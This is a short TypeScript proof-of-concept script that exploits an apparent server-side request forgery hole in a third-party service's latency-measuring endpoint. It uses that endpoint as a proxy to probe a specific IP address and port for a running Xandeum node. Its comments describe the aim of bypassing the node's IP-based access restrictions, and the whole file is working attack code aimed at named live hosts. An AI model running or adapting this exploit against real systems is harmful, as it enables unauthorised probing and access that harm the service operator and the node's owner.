
import axios from 'axios';

const PROXY_URL = 'https://pglobe.onrender.com/api/measure-latency';
const TARGET_IP = '216.234.134.1';
const TARGET_PORT = 6000;

async function getDetails() {
    // The SSRF hole is a GET request, so we can't easily send a POST body to the target 
    // UNLESS the target accepts GET (pRPC usually is POST).
    // However, we discovered 'app/api/measure-latency' performs a "measureLatency" check.
    // Let's look at the code again. It sends a specific payload: {"method": "get-version", ...}
    // It DOES NOT allow us to change the body.
    // BUT! It returns the latency.

    // IF the proxy code (measure-latency) hardcodes the body to "get-version", 
    // then successfully hitting it WILL return a 200 OK and valid latency from the node.
    // AND, crucially, if the node restricts access to specific IPs, utilizing the proxy 
    // proves we can bypass that restriction.

    console.log(`Checking ${TARGET_IP}:${TARGET_PORT} via Proxy...`);

    try {
        const targetUrl = `http://${TARGET_IP}:${TARGET_PORT}/rpc`;
        const response = await axios.get(PROXY_URL, {
            params: { target: targetUrl },
            timeout: 5000
        });

        if (response.data.latency !== null) {
            console.log(`[+] SUCCESS: Node is Reachable via Proxy!`);
            console.log(`[+] Latency: ${response.data.latency}ms`);
            console.log(`[+] This confirms it is a running Xandeum Node.`);
        } else {
            console.log(`[-] Node unreachable or Port 6000 closed.`);
        }
    } catch (e: any) {
        console.log(`[-] Error: ${e.message}`);
    }
}

getDetails();
